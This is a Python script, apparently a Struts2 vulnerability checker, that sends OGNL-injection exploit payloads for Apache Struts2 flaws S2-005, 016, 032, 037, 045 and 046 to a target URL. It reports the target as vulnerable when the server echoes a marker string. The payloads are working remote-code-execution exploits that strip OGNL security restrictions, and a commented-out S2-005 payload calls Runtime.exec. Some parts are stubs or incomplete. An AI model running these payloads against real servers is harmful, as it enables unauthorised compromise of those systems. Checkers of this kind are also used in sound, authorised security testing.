import requests

def run(url):
    def str2_005(url):
        print("005: 复现失败")
    """
        url = url + r"?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&('\u0023mycmd\u003d\'echo ecat\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))"
        re = requests.get(url).text
        if "ecat" in re:
            print("    \033[0;36;31m存在Struts2-005!\033[0m")
    str2_005()
    """
    def str2_016(url):
        url = url + r"""?redirect:$%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print('ecat_'),%23resp.getWriter%28%29.print%28%22flag%22%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d"""
        re = requests.get(url).text
        if "ecat_flag" in re:
            print("    \033[0;36;31m存在Struts2-016!\033[0m")

    def str2_032(url):
        url = url + r"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web%5B0%5D),%23w.print(%23parameters.path%5B0%5D),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=ecat_&path=flag"
        re = requests.get(url).text
        if "ecat_flag" in re:
            print("    \033[0;36;31m存在Struts2-032!\033[0m")

    def str2_037(url):
        url = url + r"//(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web%5B0%5D),%23w.print(%23parameters.path%5B0%5D),%23w.close()):xx.toString.json?&pp=%2f&encoding=UTF-8&web=ecat_&path=flag"
        re = requests.get(url).text
        if "ecat_flag" in re:
            print("    \033[0;36;31m存在Struts2-037!\033[0m")

    def str2_045(url):
        headers = {"Content-Type": "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('ecat_')).(#res.getWriter().print('flag')).(#res.getWriter().flush()).(#res.getWriter().close())}"}
        re = requests.get(url, headers=headers).text
        if "ecat_flag" in re:
            print("    \033[0;36;31m存在Struts2-045!\033[0m")


    def str2_046(url):
        headers = {
            "Accept-Language": "zh_CN",
            "Accept": None,
            "User-Agent": "Auto Spider 1.0",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Content-Length": "874",
            "Content-Type": "multipart/form-data; boundary=---------------------------7e116d19044c"
        }
        data = "-----------------------------7e116d19044c\nContent-Disposition: form-data; name=\"test\"; filename=\"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}.b\"\nContent-Type: text/plain\n\nx\n-----------------------------7e116d19044c--"
        session = requests.Session()
        # 后session clear，clear这个是比较关键的写法。
        session.headers.clear()
        session.headers.update(
            headers
        )
        re = requests.post(url, headers=headers, data=data).text
        print(re)

    def str2_048(url):
        print("048:" + url)


    str2_005(url)
    str2_016(url)
    str2_032(url)
    str2_037(url)
    str2_045(url)
    str2_046(url)
    str2_048(url)